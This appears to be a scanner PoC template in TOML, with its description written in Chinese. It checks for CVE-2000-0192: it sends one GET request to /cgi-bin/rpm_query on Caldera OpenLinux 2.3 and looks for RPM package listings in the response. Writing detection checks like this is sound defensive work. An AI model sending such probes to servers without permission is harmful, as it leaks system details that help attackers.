[info]
author = "ave"
description = "检测目标服务器上是否存在 rpm_query CGI 脚本，该脚本未授权即可查询系统已安装的 RPM 软件包列表，导致敏感信息泄露。通过发送 HTTP GET 请求访问 /cgi-bin/rpm_query 路径，若响应中包含 RPM 包信息则判定存在漏洞。"
id = "POC-AVE-2000-0169"
name = "Caldera OpenLinux 2.3 rpm_query CGI 信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0169"]
vuln_id = [
    "CVE-2000-0192",
    "AVE-2000-0169",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/rpm_query"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "rpm_query",
    "Packages",
    "Name",
    "Version",
    "Release",
]
